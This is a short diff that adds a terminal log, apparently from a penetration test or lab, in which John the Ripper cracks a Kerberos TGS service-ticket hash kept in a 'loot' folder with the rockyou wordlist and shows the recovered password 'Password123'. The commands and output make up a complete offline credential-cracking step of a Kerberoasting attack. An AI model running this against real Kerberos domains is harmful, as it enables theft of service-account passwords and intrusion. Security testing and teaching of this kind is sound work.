@@ -1,0 +1,14 @@
+$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt loot/tgs_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Password123      (?)     
+1g 0:00:00:00 DONE (2026-10-19 09:19) 33.33g/s 1126Kp/s 1126Kc/s 1126KC/s katten..redlips
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+$ john --format=krb5tgs --show loot/tgs_hash.txt
+?:Password123
+
+1 password hash cracked, 0 left
